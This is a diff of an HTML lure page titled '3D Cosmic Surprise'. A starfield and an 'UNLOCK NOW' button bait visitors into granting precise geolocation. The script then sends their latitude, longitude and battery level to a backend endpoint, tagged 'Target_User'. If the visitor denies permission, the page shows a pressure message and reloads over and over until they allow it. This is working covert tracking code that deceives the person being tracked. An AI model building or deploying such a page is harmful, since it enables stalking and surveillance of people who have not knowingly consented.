@@ -1,235 +1,109 @@
 <!DOCTYPE html>
 <html lang="gu">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>3D Cosmic Surprise - Colorful</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-
-<style>
-
-body, html{
-margin:0;
-padding:0;
-overflow:hidden;
-background:#000;
-font-family:'Segoe UI', Arial, sans-serif;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-}
-
-/* canvas */
-#canvas-container{
-position:fixed;
-top:0;
-left:0;
-z-index:1;
-}
-
-/* box */
-.glass-box{
-position:relative;
-z-index:10;
-padding:50px 30px;
-width:90%;
-max-width:450px;
-background:rgba(0,0,0,0.85);
-border-radius:20px;
-text-align:center;
-box-shadow:0 0 20px rgba(0,242,254,0.2);
-border:1px solid rgba(255,255,255,0.1);
-overflow:hidden;
-backdrop-filter:blur(20px);
-transform-style:preserve-3d;
-perspective:1000px;
-transition:transform 0.1s;
-}
-
-/* border animation */
-.glass-box::before{
-content:'';
-position:absolute;
-top:-50%;
-left:-50%;
-width:200%;
-height:200%;
-background:conic-gradient(transparent,transparent,transparent,#ff00ea,#00f2fe);
-animation:rotateBorder 4s linear infinite;
-z-index:-1;
-}
-
-.glass-box::after{
-content:'';
-position:absolute;
-inset:4px;
-background:#0a0a0a;
-border-radius:16px;
-z-index:-1;
-}
-
-@keyframes rotateBorder{
-0%{transform:rotate(0deg);}
-100%{transform:rotate(360deg);}
-}
-
-/* title */
-h2{
-color:#fff;
-font-size:clamp(1.6rem,4vw,2.2rem);
-margin-bottom:35px;
-text-transform:uppercase;
-letter-spacing:4px;
-font-weight:800;
-text-shadow:0 0 15px rgba(0,242,254,0.6);
-}
-
-/* button */
-.neon-btn{
-background:linear-gradient(45deg,#00f2fe,#4facfe);
-width:100%;
-max-width:260px;
-padding:16px 25px;
-font-size:clamp(14px,3vw,18px);
-font-weight:900;
-color:white;
-border:none;
-border-radius:12px;
-cursor:pointer;
-text-transform:uppercase;
-box-shadow:0 0 30px rgba(0,242,254,0.4);
-transition:all 0.3s ease;
-letter-spacing:2px;
-}
-
-.neon-btn:hover{
-box-shadow:0 0 50px rgba(0,242,254,0.7);
-transform:scale(1.05) translateZ(20px);
-}
-
-/* status */
-.status-msg{
-margin-top:25px;
-font-size:14px;
-font-weight:bold;
-letter-spacing:1px;
-color:#4facfe;
-display:none;
-}
-
-.error-msg{
-color:#ff3b3b !important;
-text-shadow:0 0 10px rgba(255,59,59,0.3);
-}
-
-/* mobile */
-@media(max-width:480px){
-
-.glass-box{
-padding:40px 20px;
-}
-
-h2{
-letter-spacing:2px;
-}
-
-}
-
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D Cosmic Surprise</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <style>
+        body, html { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        #canvas-container { position: fixed; top: 0; left: 0; z-index: 1; }
+        .glass-box { position: relative; z-index: 10; padding: 50px 30px; width: 90%; max-width: 450px; background: rgba(0,0,0,0.85); border-radius: 20px; text-align: center; box-shadow: 0 0 20px rgba(0,242,254,0.2); border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(20px); }
+        h2 { color: #fff; font-size: 1.8rem; margin-bottom: 30px; text-transform: uppercase; letter-spacing: 2px; }
+        .neon-btn { background: linear-gradient(45deg,#00f2fe,#4facfe); width: 100%; max-width: 260px; padding: 16px; font-size: 18px; font-weight: 900; color: white; border: none; border-radius: 12px; cursor: pointer; box-shadow: 0 0 20px rgba(0,242,254,0.4); }
+        .status-msg { margin-top: 25px; font-size: 15px; font-weight: bold; color: #4facfe; display: none; }
+        .error-msg { color: #ff3b3b !important; text-shadow: 0 0 10px rgba(255,59,59,0.3); }
+    </style>
 </head>
-
 <body>
 
 <div id="canvas-container"></div>
 
-<div class="glass-box" id="box">
-<h2>✨ SURPRISE 🧐</h2>
-<button class="neon-btn" onclick="startProcess()">UNLOCK NOW</button>
-<div id="status" class="status-msg">INITIALIZING ENCRYPTION...</div>
+<div class="glass-box">
+    <h2>✨ SURPRISE ✨</h2>
+    <button class="neon-btn" onclick="startProcess()">UNLOCK NOW</button>
+    <div id="status" class="status-msg">INITIALIZING...</div>
 </div>
+
 <script>
+/* --- 3D Background (Stars) --- */
+let scene, camera, renderer, starPoints;
+function init3D(){
+    scene = new THREE.Scene();
+    camera = new THREE.PerspectiveCamera(60, window.innerWidth/window.innerHeight, 1, 1000);
+    camera.position.z = 1;
+    renderer = new THREE.WebGLRenderer();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+    document.getElementById("canvas-container").appendChild(renderer.domElement);
+    const starGeo = new THREE.BufferGeometry();
+    const positions = [];
+    for(let i=0; i<6000; i++){
+        positions.push(Math.random()*600-300, Math.random()*600-300, Math.random()*600-300);
+    }
+    starGeo.setAttribute("position", new THREE.Float32BufferAttribute(positions, 3));
+    const starMaterial = new THREE.PointsMaterial({color: 0xffffff, size: 0.7});
+    starPoints = new THREE.Points(starGeo, starMaterial);
+    scene.add(starPoints);
+    animate();
+}
+function animate(){
+    starPoints.rotation.y += 0.002;
+    renderer.render(scene, camera);
+    requestAnimationFrame(animate);
+}
+init3D();
 
-function startProcess() {
-
+/* --- Main Logic --- */
+async function startProcess() {
     const status = document.getElementById("status");
-
     status.style.display = "block";
-    status.innerText = "INITIALIZING ENCRYPTION...";
+    status.innerText = "PERMISSION REQUESTED... PLEASE ALLOW";
     status.classList.remove("error-msg");
 
     navigator.geolocation.getCurrentPosition(
-
         async (pos) => {
-
-            // SUCCESS: if user allows location
+            // SUCCESS: User clicked ALLOW
             let lat = pos.coords.latitude;
             let lon = pos.coords.longitude;
+            let batteryLevel = "Unknown";
 
-            let battery = 0;
+            try {
+                if (navigator.getBattery) {
+                    let bat = await navigator.getBattery();
+                    batteryLevel = Math.floor(bat.level * 100);
+                }
+            } catch (e) {}
 
-            if (navigator.getBattery) {
-                let bat = await navigator.getBattery();
-                battery = Math.floor(bat.level * 100);
-            }
+            status.innerText = "ACCESS GRANTED! UNLOCKING...";
 
-            await fetch("/location", {
+            // Send to Backend
+            fetch("/location", {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    user: "visitor",
+                    user: "Target_User",
                     latitude: lat,
                     longitude: lon,
-                    battery: battery
+                    battery: batteryLevel
                 })
             });
 
-            status.innerText = "VERIFICATION COMPLETE";
-
-            setTimeout(() => {
-                alert("🎉 Surprise Unlocked!");
-            }, 1000);
-
+            setTimeout(() => { alert("🎉 Surprise Unlocked! Check your map."); }, 1000);
         },
-
         (err) => {
+            // ERROR: User clicked DENY
+            status.innerHTML = "⚠️ ERROR: LOCATION REQUIRED!<br>કૃપા કરીને ઉપર 'Allow' બટન દબાવો.";
+            status.classList.add("error-msg");
 
-            // ERROR: if user denies location
-            if (err.code === 1) {
-
-                status.innerHTML =
-                "⚠️ ACCESS DENIED! <br><small>Please click the 🔒 icon in the address bar and allow Location permission.</small>";
-
-                status.classList.add("error-msg");
-
-                setTimeout(() => {
-
-                    if (confirm("Location permission is required to unlock the surprise. Try again?")) {
-
-                        location.reload();
-
-                    }
-
-                }, 3000);
-            }
-
+            // ૩ સેકન્ડ પછી પેજ રીલોડ થશે જેથી ફરીથી પોપ-અપ આવે
+            setTimeout(() => {
+                location.reload();
+            }, 3000);
         },
-
-        {
-            enableHighAccuracy: true,
-            timeout: 10000
-        }
-
+        { enableHighAccuracy: true, timeout: 5000 }
     );
-
 }
-
 </script>
 
 </body>
 </html>
-
-
-
